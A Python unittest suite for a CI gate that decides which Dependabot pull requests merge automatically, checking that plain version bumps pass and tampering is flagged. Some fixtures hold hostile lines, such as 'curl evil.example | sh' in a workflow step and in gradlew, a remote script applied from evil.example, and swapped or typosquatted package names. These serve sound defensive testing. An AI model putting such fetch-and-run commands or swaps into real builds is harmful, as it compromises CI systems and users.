"""
Checks for the gate that decides which Dependabot pull requests merge by themselves. Each test
builds a scratch git repository with main's manifests, commits a change as Dependabot (and
sometimes a second one as the repair job), and asks the gate about it.

    python3 -m unittest scripts/ci/test_dependency_gate.py

Standard library only; needs git on the path.
"""

import contextlib
import io
import os
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import dependency_gate  # noqa: E402

CATALOG = """\
[versions]
# A comment about Kotlin.
kotlin = "2.4.20"
ktor = "3.5.2"
agp = "9.5.0-alpha07"
ffmpeg = "8.1.2-1.5.14"

[libraries]
ktor-client-core = { module = "io.ktor:ktor-client-core", version.ref = "ktor" }

[plugins]
kotlinJvm = { id = "org.jetbrains.kotlin.jvm", version.ref = "kotlin" }
"""

WRAPPER = """\
distributionBase=GRADLE_USER_HOME
distributionSha256Sum=dce76f55f8e251a3a1f130eb120f30b3d271de2b76c9b0729d316b5a1b6dc01f
distributionUrl=https\\://services.gradle.org/distributions/gradle-9.8.1-bin.zip
networkTimeout=10000
"""

WORKFLOW = """\
jobs:
  build:
    steps:
      - uses: actions/checkout@v7
      - uses: gradle/actions/setup-gradle@0123456789abcdef0123456789abcdef01234567 # v6.1.0
      - run: ./gradlew build
"""

REQUIREMENTS = "fastapi==0.115.6\nuvicorn==0.34.0\n"
DOCKERFILE = "FROM python:3.13-slim\nWORKDIR /app\nRUN pip install -r requirements.txt\n"
SETTINGS = 'plugins {\n    id("org.gradle.toolchains.foojay-resolver-convention") version "1.0.0"\n}\n'
SOURCE = 'fun greeting() = "hello"\n'

MAIN = {
    "gradle/libs.versions.toml": CATALOG,
    "gradle/wrapper/gradle-wrapper.properties": WRAPPER,
    "gradle/wrapper/gradle-wrapper.jar": b"\x00\x01jar-one\xff",
    "gradlew": "#!/bin/sh\necho one\n",
    ".github/workflows/ci.yml": WORKFLOW,
    "relay/requirements.txt": REQUIREMENTS,
    "relay/Dockerfile": DOCKERFILE,
    "settings.gradle.kts": SETTINGS,
    "shared/src/Greeting.kt": SOURCE,
}

DEPENDABOT = "dependabot[bot]"
REPAIR = "github-actions[bot]"


class GateTest(unittest.TestCase):
    def setUp(self):
        self.dir = tempfile.TemporaryDirectory()
        self.addCleanup(self.dir.cleanup)
        self.git("init", "--quiet", "--initial-branch=main")
        self.base = self.commit("someone", MAIN)

    def git(self, *args, **env):
        return subprocess.run(
            ["git", "-C", self.dir.name, *args],
            check=True,
            capture_output=True,
            env={**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_SYSTEM": os.devnull, **env},
        ).stdout.decode().strip()

    def commit(self, author, files, delete=()):
        for path, content in files.items():
            full = os.path.join(self.dir.name, path)
            os.makedirs(os.path.dirname(full), exist_ok=True)
            with open(full, "wb") as out:
                out.write(content if isinstance(content, bytes) else content.encode())
        for path in delete:
            os.remove(os.path.join(self.dir.name, path))
        self.git("add", "--all")
        identity = {"GIT_AUTHOR_NAME": author, "GIT_AUTHOR_EMAIL": "a@example.com"}
        self.git("commit", "--quiet", "--allow-empty", "-m", "change", **identity,
                 GIT_COMMITTER_NAME="committer", GIT_COMMITTER_EMAIL="c@example.com")
        return self.git("rev-parse", "HEAD")

    def verdict(self, head):
        return dependency_gate.evaluate(dependency_gate.Repo(self.dir.name), self.base, head)

    def assertSimple(self, head):
        verdict = self.verdict(head)
        self.assertTrue(verdict.simple, verdict.as_markdown())
        return verdict

    def assertNeedsAPerson(self, head, because):
        verdict = self.verdict(head)
        self.assertFalse(verdict.simple, "the gate let this through")
        self.assertIn(because, verdict.as_markdown())
        return verdict

    # What Dependabot does by itself.

    def test_catalog_versions(self):
        head = self.commit(DEPENDABOT, {"gradle/libs.versions.toml": CATALOG
                                        .replace('ktor = "3.5.2"', 'ktor = "3.6.0"')
                                        .replace("9.5.0-alpha07", "9.5.0-alpha08")
                                        .replace("8.1.2-1.5.14", "8.2-1.5.15")})
        verdict = self.assertSimple(head)
        self.assertEqual(
            ["ktor 3.5.2 → 3.6.0", "agp 9.5.0-alpha07 → 9.5.0-alpha08", "ffmpeg 8.1.2-1.5.14 → 8.2-1.5.15"],
            verdict.files[0].updates,
        )
        self.assertEqual(0, verdict.other_commits)

    def test_every_ecosystem_at_once(self):
        head = self.commit(DEPENDABOT, {
            "gradle/libs.versions.toml": CATALOG.replace("2.4.20", "2.5.0"),
            "gradle/wrapper/gradle-wrapper.properties": WRAPPER.replace("9.8.1", "9.9").replace("dce76f55", "0123abcd"),
            "gradle/wrapper/gradle-wrapper.jar": b"\x00\x01jar-two\xff",
            "gradlew": "#!/bin/sh\necho two\n",
            ".github/workflows/ci.yml": WORKFLOW.replace("checkout@v7", "checkout@v8").replace(
                "0123456789abcdef0123456789abcdef01234567 # v6.1.0",
                "89abcdef0123456789abcdef0123456789abcdef # v6.2.0"),
            "relay/requirements.txt": REQUIREMENTS.replace("0.115.6", "0.130.0"),
            "relay/Dockerfile": DOCKERFILE.replace("3.13-slim", "3.14-slim"),
            "settings.gradle.kts": SETTINGS.replace("1.0.0", "1.1.0"),
        })
        verdict = self.assertSimple(head)
        updates = [update for changed in verdict.files for update in changed.updates]
        self.assertIn("Gradle 9.8.1 → 9.9", updates)
        self.assertIn("actions/checkout v7 → v8", updates)
        self.assertIn("fastapi 0.115.6 → 0.130.0", updates)
        self.assertIn("python 3.13-slim → 3.14-slim", updates)
        self.assertIn("org.gradle.toolchains.foojay-resolver-convention 1.0.0 → 1.1.0", updates)

    def test_library_coordinates_in_a_build_script(self):
        script = 'dependencies {\n    implementation("io.ktor:ktor-client-core:3.5.2")\n}\n'
        self.base = self.commit("someone", {"app/build.gradle.kts": script})
        self.assertSimple(self.commit(DEPENDABOT, {"app/build.gradle.kts": script.replace("3.5.2", "3.6.0")}))
        swapped = script.replace("io.ktor:ktor-client-core:3.5.2", "io.evil:ktor-client-core:3.5.2")
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {"app/build.gradle.kts": swapped}), "line 2")

    # What must wait for someone.

    def test_source_change(self):
        head = self.commit(DEPENDABOT, {
            "gradle/libs.versions.toml": CATALOG.replace("3.5.2", "4.0.0"),
            "shared/src/Greeting.kt": 'fun greeting() = "hi"\n',
        })
        verdict = self.assertNeedsAPerson(head, "`shared/src/Greeting.kt`: not a dependency manifest")
        self.assertTrue(verdict.files[0].ok)

    def test_new_and_deleted_files(self):
        head = self.commit(DEPENDABOT, {"shared/src/New.kt": SOURCE}, delete=["relay/Dockerfile"])
        verdict = self.assertNeedsAPerson(head, "a new file")
        self.assertIn("a deleted file", verdict.as_markdown())

    def test_new_library_in_the_catalog(self):
        added = CATALOG.replace("[plugins]", 'evil = { module = "io.evil:evil", version = "1.0" }\n\n[plugins]')
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {"gradle/libs.versions.toml": added}), "lines were added or removed")

    def test_catalog_line_outside_versions(self):
        moved = CATALOG.replace('module = "io.ktor:ktor-client-core"', 'module = "io.evil:ktor-client-core"')
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {"gradle/libs.versions.toml": moved}), "other than a `[versions]` entry")

    def test_catalog_key_renamed(self):
        renamed = CATALOG.replace('ktor = "3.5.2"', 'ktxr = "3.5.2"')
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {"gradle/libs.versions.toml": renamed}), "line 4")

    def test_workflow_step_changed(self):
        changed = WORKFLOW.replace("./gradlew build", "curl evil.example | sh")
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {".github/workflows/ci.yml": changed}), "other than the version of an action")

    def test_workflow_action_swapped(self):
        changed = WORKFLOW.replace("actions/checkout@v7", "evil/checkout@v7")
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {".github/workflows/ci.yml": changed}), "line 4")

    def test_requirement_swapped_or_unpinned(self):
        self.assertNeedsAPerson(
            self.commit(DEPENDABOT, {"relay/requirements.txt": REQUIREMENTS.replace("fastapi==", "fastapl==")}), "line 1")
        self.assertNeedsAPerson(
            self.commit(DEPENDABOT, {"relay/requirements.txt": REQUIREMENTS.replace("uvicorn==0.34.0", "uvicorn>=0.34.0")}), "line 2")

    def test_dockerfile_other_lines(self):
        self.assertNeedsAPerson(
            self.commit(DEPENDABOT, {"relay/Dockerfile": DOCKERFILE.replace("FROM python", "FROM evil/python")}), "line 1")
        self.assertNeedsAPerson(
            self.commit(DEPENDABOT, {"relay/Dockerfile": DOCKERFILE.replace("pip install", "pip  install")}), "line 3")

    def test_wrapper_from_somewhere_else(self):
        elsewhere = WRAPPER.replace("services.gradle.org", "evil.example")
        self.assertNeedsAPerson(
            self.commit(DEPENDABOT, {"gradle/wrapper/gradle-wrapper.properties": elsewhere}), "not a distribution from services.gradle.org")

    def test_wrapper_jar_without_a_new_gradle(self):
        head = self.commit(DEPENDABOT, {"gradle/wrapper/gradle-wrapper.jar": b"other"})
        self.assertNeedsAPerson(head, "without a new Gradle version")

    def test_wrapper_jar_beside_only_a_new_checksum(self):
        head = self.commit(DEPENDABOT, {
            "gradle/wrapper/gradle-wrapper.properties": WRAPPER.replace("dce76f55", "0123abcd"),
            "gradle/wrapper/gradle-wrapper.jar": b"other",
            "gradlew": "#!/bin/sh\ncurl evil.example | sh\n",
        })
        verdict = self.assertNeedsAPerson(head, "without a new Gradle version")
        self.assertEqual(2, sum(not changed.ok for changed in verdict.files))

    def test_every_dependabot_commit_is_reported(self):
        first = self.commit(DEPENDABOT, {"relay/requirements.txt": REQUIREMENTS.replace("0.34.0", "0.1.0")})
        second = self.commit(DEPENDABOT, {"gradle/libs.versions.toml": CATALOG.replace("3.5.2", "3.6.0")})
        verdict = self.verdict(second)
        self.assertEqual([first, second], verdict.dependabot_commits)
        self.assertEqual([first, second], verdict.as_json()["dependabot_commits"])

    def test_settings_script_code(self):
        changed = SETTINGS + 'apply(from = "https://evil.example/x.gradle.kts")\n'
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {"settings.gradle.kts": changed}), "lines were added or removed")

    def test_not_from_dependabot(self):
        head = self.commit("someone", {"gradle/libs.versions.toml": CATALOG.replace("3.5.2", "3.6.0")})
        self.assertNeedsAPerson(head, "no commit by Dependabot")

    def test_nothing_changed(self):
        self.assertNeedsAPerson(self.commit(DEPENDABOT, {}), "nothing differs from main")

    # The repair job's commit on top of Dependabot's.

    def test_holding_an_update_back(self):
        proposed = CATALOG.replace("2.4.20", "2.5.0").replace("3.5.2", "3.6.0")
        self.commit(DEPENDABOT, {"gradle/libs.versions.toml": proposed, "relay/requirements.txt": REQUIREMENTS.replace("0.34.0", "0.40.0")})
        head = self.commit(REPAIR, {"gradle/libs.versions.toml": proposed.replace("2.5.0", "2.4.20"), "relay/requirements.txt": REQUIREMENTS})
        verdict = self.assertSimple(head)
        self.assertEqual(1, verdict.other_commits)
        self.assertEqual(["ktor 3.5.2 → 3.6.0"], verdict.files[0].updates)
        self.assertEqual(2, len(verdict.held_back))
        self.assertIn('`kotlin = "2.4.20"` (Dependabot proposed `kotlin = "2.5.0"`)', verdict.held_back[0])
        self.assertEqual("`relay/requirements.txt`: every change", verdict.held_back[1])

    def test_later_commit_picks_its_own_version(self):
        proposed = CATALOG.replace("3.5.2", "3.6.0")
        self.commit(DEPENDABOT, {"gradle/libs.versions.toml": proposed})
        head = self.commit(REPAIR, {"gradle/libs.versions.toml": proposed.replace("3.6.0", "2.0.0")})
        self.assertNeedsAPerson(head, "neither main's nor Dependabot's")

    def test_later_commit_bumps_something_dependabot_did_not(self):
        self.commit(DEPENDABOT, {"gradle/libs.versions.toml": CATALOG.replace("3.5.2", "3.6.0")})
        head = self.commit(REPAIR, {"relay/requirements.txt": REQUIREMENTS.replace("0.34.0", "0.40.0")})
        self.assertNeedsAPerson(head, "neither main's nor Dependabot's")

    def test_later_commit_fixes_source(self):
        self.commit(DEPENDABOT, {"gradle/libs.versions.toml": CATALOG.replace("3.5.2", "4.0.0")})
        head = self.commit(REPAIR, {"shared/src/Greeting.kt": 'fun greeting() = "hi"\n'})
        self.assertNeedsAPerson(head, "not a dependency manifest")

    def test_later_commit_swaps_the_wrapper_jar(self):
        self.commit(DEPENDABOT, {
            "gradle/wrapper/gradle-wrapper.properties": WRAPPER.replace("9.8.1", "9.9"),
            "gradle/wrapper/gradle-wrapper.jar": b"\x00\x01jar-two\xff",
        })
        head = self.commit(REPAIR, {"gradle/wrapper/gradle-wrapper.jar": b"evil"})
        self.assertNeedsAPerson(head, "differs from what Dependabot committed")

    def test_dependabot_commit_after_another(self):
        self.commit(REPAIR, {"relay/requirements.txt": REQUIREMENTS.replace("0.34.0", "0.40.0")})
        head = self.commit(DEPENDABOT, {"gradle/libs.versions.toml": CATALOG.replace("3.5.2", "3.6.0")})
        self.assertNeedsAPerson(head, "not all first on the branch")

    # The command line.

    def test_exit_status_and_reports(self):
        good = self.commit(DEPENDABOT, {"gradle/libs.versions.toml": CATALOG.replace("3.5.2", "3.6.0")})
        reports = tempfile.TemporaryDirectory()
        self.addCleanup(reports.cleanup)
        out = os.path.join(reports.name, "verdict.json")
        arguments = ["--repo", self.dir.name, "--base", self.base, "--json", out]

        def run(head):
            with contextlib.redirect_stdout(io.StringIO()), contextlib.redirect_stderr(io.StringIO()):
                return dependency_gate.main([*arguments, "--head", head])

        self.assertEqual(0, run(good))
        with open(out, encoding="utf-8") as report:
            self.assertIn('"simple": true', report.read())
        bad = self.commit(DEPENDABOT, {"shared/src/Greeting.kt": "fun x() = 1\n"})
        self.assertEqual(1, run(bad))
        self.assertEqual(2, run("no-such-commit"))


if __name__ == "__main__":
    unittest.main()
